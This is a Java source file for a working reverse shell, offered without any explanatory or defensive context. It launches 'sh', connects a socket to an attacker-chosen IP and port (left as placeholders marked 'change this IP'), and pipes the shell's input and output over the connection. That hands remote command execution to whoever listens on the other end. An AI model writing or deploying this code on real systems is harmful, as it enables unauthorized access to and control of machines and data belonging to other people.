import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class reverseShell {
    public static void main(String[] args) {
        String host = "00.00.00.00";//change this IP
        int port = 9500;// change this PORT
        String cmd = "sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                  System.out.println("[ERROR]: "+e.getMessage());
                }
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
          System.out.println("[ERROR]: "+e.getMessage());
        }
    }
}
